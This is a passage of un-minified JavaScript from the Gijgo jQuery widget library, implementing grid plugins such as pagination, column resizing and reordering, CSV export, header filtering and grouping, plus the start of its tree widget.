      e.triggerHandler("pageSizeChange", [t]);
    },
    pageChanging: function (e, t) {
      e.triggerHandler("pageChanging", [t]);
    }
  },
  configure: function (i, e, t) {
    $.extend(!0, i, gj.grid.plugins.pagination.public), i.data(), t.pager && (gj.grid.methods.isLastRecordVisible = gj.grid.plugins.pagination.private.isLastRecordVisible, i.on("initialized", function () {
      gj.grid.plugins.pagination.private.init(i);
    }), i.on("dataBound", function (e, t, n) {
      gj.grid.plugins.pagination.private.reloadPager(i, n);
    }), i.on("columnShow", function () {
      gj.grid.plugins.pagination.private.updatePagerColSpan(i);
    }), i.on("columnHide", function () {
      gj.grid.plugins.pagination.private.updatePagerColSpan(i);
    }));
  }
}, gj.grid.plugins.responsiveDesign = {
  config: {
    base: {
      resizeCheckInterval: 500,
      responsive: !1,
      showHiddenColumnsAsDetails: !1,
      defaultColumn: {
        priority: void 0,
        minWidth: 250
      },
      style: {
        rowDetailItem: ""
      }
    },
    bootstrap: {
      style: {
        rowDetailItem: "col-lg-4"
      }
    }
  },
  private: {
    orderColumns: function (e) {
      var t = [];
      if (e.columns && e.columns.length) {
        for (i = 0; i < e.columns.length; i++) t.push({
          position: i,
          field: e.columns[i].field,
          minWidth: e.columns[i].width || e.columns[i].minWidth || e.defaultColumn.minWidth,
          priority: e.columns[i].priority || 0
        });
        t.sort(function (e, t) {
          var n = 0;
          return e.priority < t.priority ? n = -1 : e.priority > t.priority && (n = 1), n;
        });
      }
      return t;
    },
    updateDetails: function (e) {
      var t, n, i, o, r, a, s, l, d;
      for (t = e.find('tbody > tr[data-role="row"]'), n = e.data(), i = 0; i < t.length; i++) {
        for (a = (r = $(t[i])).data("details"), o = 0; o < n.columns.length; o++) l = n.columns[o], s = a && a.find('div[data-id="' + l.field + '"]'), n.columns[o].hidden ? (d = "<b>" + (l.title || l.field) + "</b>: {" + l.field + "}", s && s.length ? s.empty().html(d) : ((s = $('<div data-id="' + l.field + '"/>').html(d)).addClass(n.style.rowDetailItem), a && a.length || (a = $('<div class="row"/>')), a.append(s))) : s && s.length && s.remove();
        e.updateDetails(r);
      }
    }
  },
  public: {
    oldWidth: void 0,
    resizeCheckIntervalId: void 0,
    makeResponsive: function () {
      var e,
        t,
        n = 0,
        i = this.data(),
        o = gj.grid.plugins.responsiveDesign.private.orderColumns(i);
      for (e = 0; e < o.length; e++) (t = this.find("thead>tr>th:eq(" + o[e].position + ")")).is(":visible") && o[e].minWidth < t.width() && (n += t.width() - o[e].minWidth);
      if (n) for (e = 0; e < o.length; e++) !(t = this.find("thead>tr>th:eq(" + o[e].position + ")")).is(":visible") && o[e].minWidth <= n && (this.showColumn(o[e].field), n -= t.width());
      for (e = o.length - 1; 0 <= e; e--) (t = this.find("thead>tr>th:eq(" + o[e].position + ")")).is(":visible") && o[e].priority && o[e].minWidth > t.outerWidth() && this.hideColumn(o[e].field);
      return this;
    }
  },
  events: {
    resize: function (e, t, n) {
      e.triggerHandler("resize", [t, n]);
    }
  },
  configure: function (t, e, n) {
    $.extend(!0, t, gj.grid.plugins.responsiveDesign.public), e.responsive && (t.on("initialized", function () {
      t.makeResponsive(), t.oldWidth = t.width(), t.resizeCheckIntervalId = setInterval(function () {
        var e = t.width();
        e !== t.oldWidth && gj.grid.plugins.responsiveDesign.events.resize(t, e, t.oldWidth), t.oldWidth = e;
      }, e.resizeCheckInterval);
    }), t.on("destroy", function () {
      t.resizeCheckIntervalId && clearInterval(t.resizeCheckIntervalId);
    }), t.on("resize", function () {
      t.makeResponsive();
    })), e.showHiddenColumnsAsDetails && gj.grid.plugins.expandCollapseRows && (t.on("dataBound", function () {
      gj.grid.plugins.responsiveDesign.private.updateDetails(t);
    }), t.on("columnHide", function () {
      gj.grid.plugins.responsiveDesign.private.updateDetails(t);
    }), t.on("columnShow", function () {
      gj.grid.plugins.responsiveDesign.private.updateDetails(t);
    }), t.on("rowDataBound", function () {
      gj.grid.plugins.responsiveDesign.private.updateDetails(t);
    }));
  }
}, gj.grid.plugins.toolbar = {
  config: {
    base: {
      toolbarTemplate: void 0,
      title: void 0,
      style: {
        toolbar: "gj-grid-md-toolbar"
      }
    },
    bootstrap: {
      style: {
        toolbar: "gj-grid-bootstrap-toolbar"
      }
    },
    bootstrap4: {
      style: {
        toolbar: "gj-grid-bootstrap-4-toolbar"
      }
    }
  },
  private: {
    init: function (e) {
      var t, n, i;
      t = e.data(), n = e.prev('div[data-role="toolbar"]'), (void 0 !== t.toolbarTemplate || void 0 !== t.title || 0 < n.length) && (0 === n.length && (n = $('<div data-role="toolbar"></div>'), e.before(n)), n.addClass(t.style.toolbar), 0 === n.children().length && t.toolbarTemplate && n.append(t.toolbarTemplate), 0 === (i = n.find('[data-role="title"]')).length && (i = $('<div data-role="title"/>'), n.prepend(i)), t.title && i.text(t.title), t.minWidth && n.css("min-width", t.minWidth));
    }
  },
  public: {
    title: function (e) {
      var t = this.parent().find('div[data-role="toolbar"] [data-role="title"]');
      return void 0 !== e ? (t.text(e), this) : t.text();
    }
  },
  configure: function (e) {
    $.extend(!0, e, gj.grid.plugins.toolbar.public), e.on("initialized", function () {
      gj.grid.plugins.toolbar.private.init(e);
    }), e.on("destroying", function () {
      e.prev('[data-role="toolbar"]').remove();
    });
  }
}, gj.grid.plugins.resizableColumns = {
  config: {
    base: {
      resizableColumns: !1
    }
  },
  private: {
    init: function (e, t) {
      var n, i, o, r, a, s;
      if ((n = e.find('thead tr[data-role="caption"] th')).length) {
        for (o = 0; o < n.length - 1; o++) i = $(n[o]), r = $('<div class="gj-grid-column-resizer-wrapper" />'), s = parseInt(i.css("padding-right"), 10) + 3, (a = $('<span class="gj-grid-column-resizer" />').css("margin-right", "-" + s + "px")).draggable({
          start: function () {
            e.addClass("gj-unselectable"), e.addClass("gj-grid-resize-cursor");
          },
          stop: function () {
            e.removeClass("gj-unselectable"), e.removeClass("gj-grid-resize-cursor"), this.style.removeProperty("top"), this.style.removeProperty("left"), this.style.removeProperty("position");
          },
          drag: gj.grid.plugins.resizableColumns.private.createResizeHandle(e, i, t.columns[o])
        }), i.append(r.append(a));
        for (o = 0; o < n.length; o++) (i = $(n[o])).attr("width") || i.attr("width", i.outerWidth());
      }
    },
    createResizeHandle: function (u, p, h) {
      var f = u.data();
      return function (e, t) {
        var n,
          i,
          o,
          r,
          a,
          s,
          l = parseInt(p.attr("width"), 10),
          d = gj.core.position(this),
          c = (t.top, d.top, t.left - d.left);
        if (l = l || p.outerWidth(), c && (a = l + c, h.width = a, p.attr("width", a), i = p[0].cellIndex, r = p[0].parentElement.children[i + 1], s = parseInt($(r).attr("width"), 10) - c, r.setAttribute("width", s), f.resizableColumns)) for (o = u[0].tBodies[0].children, n = 0; n < o.length; n++) o[n].cells[i].setAttribute("width", a), (r = o[n].cells[i + 1]).setAttribute("width", s);
      };
    }
  },
  public: {},
  configure: function (e, t, n) {
    $.extend(!0, e, gj.grid.plugins.resizableColumns.public), t.resizableColumns && gj.draggable && e.on("initialized", function () {
      gj.grid.plugins.resizableColumns.private.init(e, t);
    });
  }
}, gj.grid.plugins.rowReorder = {
  config: {
    base: {
      rowReorder: !1,
      rowReorderColumn: void 0,
      orderNumberField: void 0,
      style: {
        targetRowIndicatorTop: "gj-grid-row-reorder-indicator-top",
        targetRowIndicatorBottom: "gj-grid-row-reorder-indicator-bottom"
      }
    }
  },
  private: {
    init: function (e) {
      var t,
        n,
        i,
        o = e.find('tbody tr[data-role="row"]');
      for (e.data("rowReorderColumn") && (n = gj.grid.methods.getColumnPosition(e.data("columns"), e.data("rowReorderColumn"))), t = 0; t < o.length; t++) i = $(o[t]), void 0 !== n ? i.find("td:eq(" + n + ")").on("mousedown", gj.grid.plugins.rowReorder.private.createRowMouseDownHandler(e, i)) : i.on("mousedown", gj.grid.plugins.rowReorder.private.createRowMouseDownHandler(e, i));
    },
    createRowMouseDownHandler: function (r, a) {
      return function (e) {
        var t,
          n,
          i = r.clone(),
          o = r.data("columns");
        for (r.addClass("gj-unselectable"), $("body").append(i), i.attr("data-role", "draggable-clone").css("cursor", "move"), i.children("thead").remove().children("tfoot").remove(), i.find('tbody tr:not([data-position="' + a.data("position") + '"])').remove(), n = i.find("tbody tr td"), t = 0; t < n.length; t++) o[t].width && n[t].setAttribute("width", o[t].width);
        i.draggable({
          stop: gj.grid.plugins.rowReorder.private.createDragStopHandler(r, a)
        }), i.css({
          position: "absolute",
          top: a.offset().top,
          left: a.offset().left,
          width: a.width(),
          zIndex: 1
        }), "true" === a.attr("data-droppable") && a.droppable("destroy"), a.siblings('tr[data-role="row"]').each(function () {
          var e = $(this);
          "true" === e.attr("data-droppable") && e.droppable("destroy"), e.droppable({
            over: gj.grid.plugins.rowReorder.private.createDroppableOverHandler(a),
            out: gj.grid.plugins.rowReorder.private.droppableOut
          });
        }), i.trigger("mousedown");
      };
    },
    createDragStopHandler: function (c, u) {
      return function (e, d) {
        $('table[data-role="draggable-clone"]').draggable("destroy").remove(), c.removeClass("gj-unselectable"), u.siblings('tr[data-role="row"]').each(function () {
          var e,
            t,
            n,
            i,
            o,
            r = $(this),
            a = r.data("position"),
            s = u.data("position"),
            l = c.data();
          if (r.droppable("isOver", d)) {
            for (a < s ? r.before(u) : r.after(u), l.records.splice(a - 1, 0, l.records.splice(s - 1, 1)[0]), e = r.parent().find('tr[data-role="row"]'), n = 0; n < e.length; n++) $(e[n]).attr("data-position", n + 1);
            if (l.orderNumberField) {
              for (n = 0; n < l.records.length; n++) l.records[n][l.orderNumberField] = n + 1;
              for (n = 0; n < e.length; n++) t = $(e[n]), o = gj.grid.methods.getId(t, l.primaryKey, t.attr("data-position")), i = gj.grid.methods.getByPosition(c, t.attr("data-position")), c.setCellContent(o, l.orderNumberField, i[l.orderNumberField]);
            }
          }
          r.removeClass("gj-grid-top-border"), r.removeClass("gj-grid-bottom-border"), r.droppable("destroy");
        });
      };
    },
    createDroppableOverHandler: function (n) {
      return function (e) {
        var t = $(this);
        t.data("position") < n.data("position") ? t.addClass("gj-grid-top-border") : t.addClass("gj-grid-bottom-border");
      };
    },
    droppableOut: function () {
      $(this).removeClass("gj-grid-top-border"), $(this).removeClass("gj-grid-bottom-border");
    }
  },
  public: {},
  configure: function (e, t, n) {
    $.extend(!0, e, gj.grid.plugins.rowReorder.public), t.rowReorder && gj.draggable && gj.droppable && e.on("dataBound", function () {
      gj.grid.plugins.rowReorder.private.init(e);
    });
  }
}, gj.grid.plugins.export = {
  config: {
    base: {}
  },
  public: {
    getCSV: function (e) {
      var t,
        n,
        i = "",
        o = "",
        r = this.data().columns,
        a = this.getAll(e);
      if (a.length) {
        for (t = 0; t < r.length; t++) gj.grid.plugins.export.public.isColumnApplicable(r[t]) && (i += '"' + (r[t].title || r[t].field).replace(/<[^>]+>/g, " ") + '",');
        for (o += i.slice(0, i.length - 1) + "\r\n", t = 0; t < a.length; t++) {
          for (i = "", n = 0; n < r.length; n++) gj.grid.plugins.export.public.isColumnApplicable(r[n]) && (i += '"' + a[t][r[n].field] + '",');
          o += i.slice(0, i.length - 1) + "\r\n";
        }
      }
      return o;
    },
    downloadCSV: function (e, t) {
      var n = document.createElement("a");
      return document.body.appendChild(n), n.download = e || "griddata.csv", -1 < window.navigator.userAgent.indexOf("Edge") ? n.href = URL.createObjectURL(new Blob([this.getCSV(t)], {
        type: "text/csv;charset=utf-8;"
      })) : n.href = "data:text/csv;charset=utf-8," + escape(this.getCSV(t)), n.click(), document.body.removeChild(n), this;
    },
    isColumnApplicable: function (e) {
      return !0 !== e.hidden && !e.role;
    }
  },
  configure: function (e) {
    $.extend(!0, e, gj.grid.plugins.export.public);
  }
}, gj.grid.plugins.columnReorder = {
  config: {
    base: {
      columnReorder: !1,
      dragReady: !1,
      style: {
        targetRowIndicatorTop: "gj-grid-row-reorder-indicator-top",
        targetRowIndicatorBottom: "gj-grid-row-reorder-indicator-bottom"
      }
    }
  },
  private: {
    init: function (e) {
      var t,
        n,
        i = e.find("thead tr th");
      for (t = 0; t < i.length; t++) (n = $(i[t])).on("mousedown", gj.grid.plugins.columnReorder.private.createMouseDownHandler(e, n)), n.on("mousemove", gj.grid.plugins.columnReorder.private.createMouseMoveHandler(e, n)), n.on("mouseup", gj.grid.plugins.columnReorder.private.createMouseUpHandler(e, n));
    },
    createMouseDownHandler: function (t) {
      return function (e) {
        t.timeout = setTimeout(function () {
          t.data("dragReady", !0);
        }, 100);
      };
    },
    createMouseUpHandler: function (t) {
      return function (e) {
        clearTimeout(t.timeout), t.data("dragReady", !1);
      };
    },
    createMouseMoveHandler: function (i, o) {
      return function (e) {
        var t, n;
        i.data("dragReady") && (i.data("dragReady", !1), t = i.clone(), n = o.index(), i.addClass("gj-unselectable"), $("body").append(t), t.attr("data-role", "draggable-clone").css("cursor", "move"), t.find("thead tr th:eq(" + n + ")").siblings().remove(), t.find('tbody tr[data-role != "row"]').remove(), t.find("tbody tr td:nth-child(" + (n + 1) + ")").siblings().remove(), t.find("tfoot").remove(), t.draggable({
          stop: gj.grid.plugins.columnReorder.private.createDragStopHandler(i, o)
        }), t.css({
          position: "absolute",
          top: o.offset().top,
          left: o.offset().left,
          width: o.width(),
          zIndex: 1
        }), "true" === o.attr("data-droppable") && o.droppable("destroy"), o.siblings("th").each(function () {
          var e = $(this);
          "true" === e.attr("data-droppable") && e.droppable("destroy"), e.droppable({
            over: gj.grid.plugins.columnReorder.private.createDroppableOverHandler(i, o),
            out: gj.grid.plugins.columnReorder.private.droppableOut
          });
        }), t.trigger("mousedown"));
      };
    },
    createDragStopHandler: function (r, a) {
      return function (e, o) {
        $('table[data-role="draggable-clone"]').draggable("destroy").remove(), r.removeClass("gj-unselectable"), a.siblings("th").each(function () {
          var e = $(this),
            t = r.data(),
            n = gj.grid.methods.getColumnPosition(t.columns, e.data("field")),
            i = gj.grid.methods.getColumnPosition(t.columns, a.data("field"));
          e.removeClass("gj-grid-left-border").removeClass("gj-grid-right-border"), e.closest("table").find('tbody tr[data-role="row"] td:nth-child(' + (e.index() + 1) + ")").removeClass("gj-grid-left-border").removeClass("gj-grid-right-border"), e.droppable("isOver", o) && (n < i ? e.before(a) : e.after(a), gj.grid.plugins.columnReorder.private.moveRowCells(r, i, n), t.columns.splice(n, 0, t.columns.splice(i, 1)[0])), e.droppable("destroy");
        });
      };
    },
    moveRowCells: function (e, t, n) {
      var i,
        o,
        r = e.find('tbody tr[data-role="row"]');
      for (i = 0; i < r.length; i++) o = $(r[i]), n < t ? o.find("td:eq(" + n + ")").before(o.find("td:eq(" + t + ")")) : o.find("td:eq(" + n + ")").after(o.find("td:eq(" + t + ")"));
    },
    createDroppableOverHandler: function (i, o) {
      return function (e) {
        var t = $(this),
          n = i.data();
        gj.grid.methods.getColumnPosition(n.columns, t.data("field")) < gj.grid.methods.getColumnPosition(n.columns, o.data("field")) ? (t.addClass("gj-grid-left-border"), i.find('tbody tr[data-role="row"] td:nth-child(' + (t.index() + 1) + ")").addClass("gj-grid-left-border")) : (t.addClass("gj-grid-right-border"), i.find('tbody tr[data-role="row"] td:nth-child(' + (t.index() + 1) + ")").addClass("gj-grid-right-border"));
      };
    },
    droppableOut: function () {
      var e = $(this);
      e.removeClass("gj-grid-left-border").removeClass("gj-grid-right-border"), e.closest("table").find('tbody tr[data-role="row"] td:nth-child(' + (e.index() + 1) + ")").removeClass("gj-grid-left-border").removeClass("gj-grid-right-border");
    }
  },
  public: {},
  configure: function (e, t, n) {
    $.extend(!0, e, gj.grid.plugins.columnReorder.public), t.columnReorder && e.on("initialized", function () {
      gj.grid.plugins.columnReorder.private.init(e);
    });
  }
}, gj.grid.plugins.headerFilter = {
  config: {
    base: {
      defaultColumnSettings: {
        filterable: !0
      },
      headerFilter: {
        type: "onenterkeypress"
      }
    }
  },
  private: {
    init: function (t) {
      var e,
        n,
        i,
        o = t.data(),
        r = $('<tr data-role="filter"/>');
      for (e = 0; e < o.columns.length; e++) n = $("<th/>"), o.columns[e].filterable && (i = $('<input data-field="' + o.columns[e].field + '" class="gj-width-full" />'), "onchange" === o.headerFilter.type ? i.on("input propertychange", function (e) {
        gj.grid.plugins.headerFilter.private.reload(t, $(this));
      }) : (i.on("keypress", function (e) {
        13 == e.which && gj.grid.plugins.headerFilter.private.reload(t, $(this));
      }), i.on("blur", function (e) {
        gj.grid.plugins.headerFilter.private.reload(t, $(this));
      })), n.append(i)), o.columns[e].hidden && n.hide(), r.append(n);
      t.children("thead").append(r);
    },
    reload: function (e, t) {
      var n = {};
      n[t.data("field")] = t.val(), e.reload(n);
    }
  },
  public: {},
  events: {},
  configure: function (e, t, n) {
    $.extend(!0, e, gj.grid.plugins.headerFilter.public), e.data(), n.headerFilter && e.on("initialized", function () {
      gj.grid.plugins.headerFilter.private.init(e);
    });
  }
}, gj.grid.plugins.grouping = {
  config: {
    base: {
      paramNames: {
        groupBy: "groupBy",
        groupByDirection: "groupByDirection"
      },
      grouping: {
        groupBy: void 0,
        direction: "asc"
      },
      icons: {
        expandGroup: '<i class="gj-icon plus" />',
        collapseGroup: '<i class="gj-icon minus" />'
      }
    },
    fontawesome: {
      icons: {
        expandGroup: '<i class="fa fa-plus" aria-hidden="true"></i>',
        collapseGroup: '<i class="fa fa-minus" aria-hidden="true"></i>'
      }
    },
    glyphicons: {
      icons: {
        expandGroup: '<span class="glyphicon glyphicon-plus" />',
        collapseGroup: '<span class="glyphicon glyphicon-minus" />'
      }
    }
  },
  private: {
    init: function (s) {
      var l,
        d = s.data();
      l = void 0, s.on("rowDataBound", function (e, t, n, i) {
        if (l !== i[d.grouping.groupBy] || 1 === t[0].rowIndex) {
          var o = gj.grid.methods.countVisibleColumns(s) - 1,
            r = $('<tr role="group" />'),
            a = $('<td class="gj-text-align-center gj-unselectable gj-cursor-pointer" />');
          a.append('<div data-role="display">' + d.icons.collapseGroup + "</div>"), a.on("click", gj.grid.plugins.grouping.private.createExpandCollapseHandler(d)), r.append(a), r.append('<td colspan="' + o + '"><div data-role="display">' + d.grouping.groupBy + ": " + i[d.grouping.groupBy] + "</div></td>"), r.insertBefore(t), l = i[d.grouping.groupBy];
        }
        t.show();
      }), d.params[d.paramNames.groupBy] = d.grouping.groupBy, d.params[d.paramNames.groupByDirection] = d.grouping.direction;
    },
    grouping: function (e, t) {
      var n = e.data();
      t.sort(gj.grid.methods.createDefaultSorter(n.grouping.direction, n.grouping.groupBy));
    },
    createExpandCollapseHandler: function (i) {
      return function (e) {
        var t = $(this),
          n = gj.grid.plugins.grouping.private;
        "row" === t.closest("tr").next(":visible").data("role") ? n.collapseGroup(i, t) : n.expandGroup(i, t);
      };
    },
    collapseGroup: function (e, t) {
      var n = t.children('div[data-role="display"]');
      t.closest("tr").nextUntil('[role="group"]').hide(), n.empty().append(e.icons.expandGroup);
    },
    expandGroup: function (e, t) {
      var n = t.children('div[data-role="display"]');
      t.closest("tr").nextUntil('[role="group"]').show(), n.empty().append(e.icons.collapseGroup);
    }
  },
  public: {},
  configure: function (n) {
    var e,
      t = n.data();
    $.extend(!0, n, gj.grid.plugins.grouping.public), t.grouping && t.grouping.groupBy && (e = {
      title: "",
      width: t.defaultIconColumnWidth,
      align: "center",
      stopPropagation: !0,
      cssClass: "gj-cursor-pointer gj-unselectable"
    }, t.columns = [e].concat(t.columns), n.on("initialized", function () {
      gj.grid.plugins.grouping.private.init(n);
    }), n.on("dataFiltered", function (e, t) {
      gj.grid.plugins.grouping.private.grouping(n, t);
    }));
  }
}, gj.grid.messages["en-us"] = {
  First: "First",
  Previous: "Previous",
  Next: "Next",
  Last: "Last",
  Page: "Page",
  FirstPageTooltip: "First Page",
  PreviousPageTooltip: "Previous Page",
  NextPageTooltip: "Next Page",
  LastPageTooltip: "Last Page",
  Refresh: "Refresh",
  Of: "of",
  DisplayingRecords: "Displaying records",
  RowsPerPage: "Rows per page:",
  Edit: "Edit",
  Delete: "Delete",
  Update: "Update",
  Cancel: "Cancel",
  NoRecordsFound: "No records found.",
  Loading: "Loading..."
}, gj.tree = {
  plugins: {}
}, gj.tree.config = {
  base: {
    params: {},
    autoLoad: !0,
    selectionType: "single",
    cascadeSelection: !1,
    dataSource: void 0,
    primaryKey: void 0,
    textField: "text",
    childrenField: "children",
    hasChildrenField: "hasChildren",
    imageCssClassField: "imageCssClass",
    imageUrlField: "imageUrl",
    imageHtmlField: "imageHtml",
    disabledField: "disabled",
    width: void 0,
    border: !1,
    uiLibrary: "materialdesign",
    iconsLibrary: "materialicons",
    autoGenId: 1,
    autoGenFieldName: "autoId_b5497cc5-7ef3-49f5-a7dc-4a932e1aee4a",
    indentation: 24,
    style: {
      wrapper: "gj-unselectable",
      list: "gj-list gj-list-md",
      item: void 0,
      active: "gj-list-md-active",
      leafIcon: void 0,
      border: "gj-tree-md-border"
    },
    icons: {
      expand: '<i class="gj-icon chevron-right" />',
      collapse: '<i class="gj-icon chevron-down" />'
    }
  },
  bootstrap: {
    style: {
      wrapper: "gj-unselectable gj-tree-bootstrap-3",
      list: "gj-list gj-list-bootstrap list-group",
      item: "list-group-item",
      active: "active",
      border: "gj-tree-bootstrap-border"
    },
    iconsLibrary: "glyphicons"
  },
  bootstrap4: {
    style: {
      wrapper: "gj-unselectable gj-tree-bootstrap-4",
      list: "gj-list gj-list-bootstrap",
      item: "list-group-item",
      active: "active",
      border: "gj-tree-bootstrap-border"
    },
    icons: {
      expand: '<i class="gj-icon plus" />',
      collapse: '<i class="gj-icon minus" />'
    }
  },
  materialicons: {
    style: {
      expander: "gj-tree-material-icons-expander"
    }
  },
  fontawesome: {
    style: {
      expander: "gj-tree-font-awesome-expander"
    },
    icons: {
      expand: '<i class="fa fa-plus" aria-hidden="true"></i>',
      collapse: '<i class="fa fa-minus" aria-hidden="true"></i>'
    }
  },
  glyphicons: {
    style: {
      expander: "gj-tree-glyphicons-expander"
    },
    icons: {
      expand: '<span class="glyphicon glyphicon-plus" />',
      collapse: '<span class="glyphicon glyphicon-minus" />'
    }
  }
}, gj.tree.events = {
  initialized: function (e) {
    e.triggerHandler("initialized");
  },
  dataBinding: function (e) {
    e.triggerHandler("dataBinding");
  },
  dataBound: function (e) {
    e.triggerHandler("dataBound");
  },
  select: function (e, t, n) {
    return e.triggerHandler("select", [t, n]);
  },
  unselect: function (e, t, n) {
    return e.triggerHandler("unselect", [t, n]);
  },
  expand: function (e, t, n) {
    return e.triggerHandler("expand", [t, n]);
  },
  collapse: function (e, t, n) {
    return e.triggerHandler("collapse", [t, n]);
  },
  enable: function (e, t) {
    return e.triggerHandler("enable", [t]);
  },
  disable: function (e, t) {
    return e.triggerHandler("disable", [t]);
  },
  destroying: function (e) {
    return e.triggerHandler("destroying");
  },
  nodeDataBound: function (e, t, n, i) {
    return e.triggerHandler("nodeDataBound", [t, n, i]);
  }
}, gj.tree.methods = {
  init: function (e) {
    return gj.widget.prototype.init.call(this, e, "tree"), gj.tree.methods.initialize.call(this), this.data("autoLoad") && this.reload(), this;
  },
  initialize: function () {
    var e = this.data(),
      t = $('<ul class="' + e.style.list + '"/>');
    this.empty().addClass(e.style.wrapper).append(t), e.width && this.width(e.width), e.border && this.addClass(e.style.border), gj.tree.events.initialized(this);
  },
  useHtmlDataSource: function (e, t) {
    t.dataSource = [];
  },
  render: function (e, t) {
    var n;
    return t && ("string" == typeof t && JSON && (t = JSON.parse(t)), (n = e.data()).records = t, n.primaryKey || gj.tree.methods.genAutoId(n, n.records), gj.tree.methods.loadData(e)), e;
  },
  filter: function (e) {
    return e.data().dataSource;
  },
  genAutoId: function (e, t) {
    var n;
    for (n = 0; n < t.length; n++) t[n][e.autoGenFieldName] = e.autoGenId++, t[n][e.childrenField] && t[n][e.childrenField].length && gj.tree.methods.genAutoId(e, t[n][e.childrenField]);
  },
  loadData: function (e) {
    var t,
      n = e.data("records"),
      i = e.children("ul");
    for (gj.tree.events.dataBinding(e), i.off().empty(), t = 0; t < n.length; t++) gj.tree.methods.appendNode(e, i, n[t], 1);
    gj.tree.events.dataBound(e);
  },
  appendNode: function (e, t, n, i, o) {
    var r,
      a,
      s,
      l,
      d,
      c = e.data(),
      u = c.primaryKey ? n[c.primaryKey] : n[c.autoGenFieldName];
    if (a = $('<li data-id="' + u + '" data-role="node" />').addClass(c.style.item), $wrapper = $('<div data-role="wrapper" />'), $expander = $('<span data-role="expander" data-mode="close"></span>').addClass(c.style.expander), $display = $('<span data-role="display">' + n[c.textField] + "</span>"), hasChildren = void 0 !== n[c.hasChildrenField] && "true" === n[c.hasChildrenField].toString().toLowerCase(), disabled = void 0 !== n[c.disabledField] && "true" === n[c.disabledField].toString().toLowerCase(), c.indentation && $wrapper.append('<span data-role="spacer" style="width: ' + c.indentation * (i - 1) + 'px;"></span>'), disabled ? gj.tree.methods.disableNode(e, a) : ($expander.on("click", gj.tree.methods.expanderClickHandler(e)), $display.on("click", gj.tree.methods.displayClickHandler(e))), $wrapper.append($expander), $wrapper.append($display), a.append($wrapper), o ? t.find("li:eq(" + (o - 1) + ")").before(a) : t.append(a), c.imageCssClassField && n[c.imageCssClassField] ? (l = $('<span data-role="image"><span class="' + n[c.imageCssClassField] + '"></span></span>')).insertBefore($display) : c.imageUrlField && n[c.imageUrlField] ? ((l = $('<span data-role="image"></span>')).insertBefore($display), (d = $('<img src="' + n[c.imageUrlField] + '"></img>')).attr("width", l.width()).attr("height", l.height()), l.append(d)) : c.imageHtmlField && n[c.imageHtmlField] && (l = $('<span data-role="image">' + n[c.imageHtmlField] + "</span>")).insertBefore($display), n[c.childrenField] && n[c.childrenField].length || hasChildren) {
      if ($expander.empty().append(c.icons.expand), s = $("<ul />").addClass(c.style.list).addClass("gj-hidden"), a.append(s), n[c.childrenField] && n[c.childrenField].length) for (r = 0; r < n[c.childrenField].length; r++) gj.tree.methods.appendNode(e, s, n[c.childrenField][r], i + 1);
    } else c.style.leafIcon ? $expander.addClass(c.style.leafIcon) : $expander.html("&nbsp;");
    gj.tree.events.nodeDataBound(e, a, n.id, n);
  },
  expanderClickHandler: function (i) {
    return function (e) {
      var t = $(this),
        n = t.closest("li");
      "close" === t.attr("data-mode") ? i.expand(n) : i.collapse(n);
    };
  },
  expand: function (e, t, n) {
    var i,
      o,
      r = t.find('>[data-role="wrapper"]>[data-role="expander"]'),
      a = e.data(),
      s = t.attr("data-id"),
      l = t.children("ul");
    if (!1 !== gj.tree.events.expand(e, t, s) && l && l.length && (l.show(), r.attr("data-mode", "open"), r.empty().append(a.icons.collapse), n)) for (i = t.find("ul>li"), o = 0; o < i.length; o++) gj.tree.methods.expand(e, $(i[o]), n);
    return e;
  },
  collapse: function (e, t, n) {
    var i,
      o,
      r = t.find('>[data-role="wrapper"]>[data-role="expander"]'),
      a = e.data(),
      s = t.attr("data-id"),
      l = t.children("ul");
    if (!1 !== gj.tree.events.collapse(e, t, s) && l && l.length && (l.hide(), r.attr("data-mode", "close"), r.empty().append(a.icons.expand), n)) for (i = t.find("ul>li"), o = 0; o < i.length; o++) gj.tree.methods.collapse(e, $(i[o]), n);
    return e;
  },
  expandAll: function (e) {
    var t,
      n = e.find("ul>li");
    for (t = 0; t < n.length; t++) gj.tree.methods.expand(e, $(n[t]), !0);
    return e;
  },
  collapseAll: function (e) {
    var t,
      n = e.find("ul>li");
    for (t = 0; t < n.length; t++) gj.tree.methods.collapse(e, $(n[t]), !0);
    return e;
  },
  displayClickHandler: function (i) {
    return function (e) {
      var t = $(this).closest("li"),
        n = i.data().cascadeSelection;
      "true" === t.attr("data-selected") ? gj.tree.methods.unselect(i, t, n) : ("single" === i.data("selectionType") && gj.tree.methods.unselectAll(i), gj.tree.methods.select(i, t, n));
    };
  },
  selectAll: function (e) {
    var t,
      n = e.find("ul>li");
    for (t = 0; t < n.length; t++) gj.tree.methods.select(e, $(n[t]), !0);
    return e;
  },
  select: function (e, t, n) {
    var i,
      o,
      r = e.data();
    if ("true" !== t.attr("data-selected") && !1 !== gj.tree.events.select(e, t, t.attr("data-id")) && (t.addClass(r.style.active).attr("data-selected", "true"), n)) for (o = t.find("ul>li"), i = 0; i < o.length; i++) gj.tree.methods.select(e, $(o[i]), n);
  },
  unselectAll: function (e) {
    var t,
      n = e.find("ul>li");
    for (t = 0; t < n.length; t++) gj.tree.methods.unselect(e, $(n[t]), !0);
    return e;
  },
  unselect: function (e, t, n) {
    var i, o;
    if (e.data(), "true" === t.attr("data-selected") && !1 !== gj.tree.events.unselect(e, t, t.attr("data-id")) && (t.removeClass(e.data().style.active).removeAttr("data-selected"), n)) for (o = t.find("ul>li"), i = 0; i < o.length; i++) gj.tree.methods.unselect(e, $(o[i]), n);
  },
  getSelections: function (e) {
    var t,
      n,
      i,
      o = [],
      r = e.children("li");
    if (r && r.length) for (t = 0; t < r.length; t++) "true" === (n = $(r[t])).attr("data-selected") ? o.push(n.attr("data-id")) : n.has("ul") && (i = gj.tree.methods.getSelections(n.children("ul"))).length && (o = o.concat(i));
    return o;
  },
  getDataById: function (e, t, n) {
    var i,
      o = e.data(),
      r = void 0;
    for (i = 0; i < n.length; i++) {
      if (o.primaryKey && n[i][o.primaryKey] == t) {
        r = n[i];
        break;
      }
      if (n[i][o.autoGenFieldName] == t) {
        r = n[i];
        break;
      }
      if (n[i][o.childrenField] && n[i][o.childrenField].length && (r = gj.tree.methods.getDataById(e, t, n[i][o.childrenField]))) break;
    }
    return r;
  },
  getDataByText: function (e, t, n) {
    var i,
      o = void 0,
      r = e.data();
    for (i = 0; i < n.length; i++) {
      if (t === n[i][r.textField]) {
        o = n[i];
        break;
      }
      if (n[i][r.childrenField] && n[i][r.childrenField].length && (o = gj.tree.methods.getDataByText(e, t, n[i][r.childrenField]))) break;
    }
    return o;
  },
  getNodeById: function (e, t) {
    var n,
      i,
      o = void 0,
      r = e.children("li");
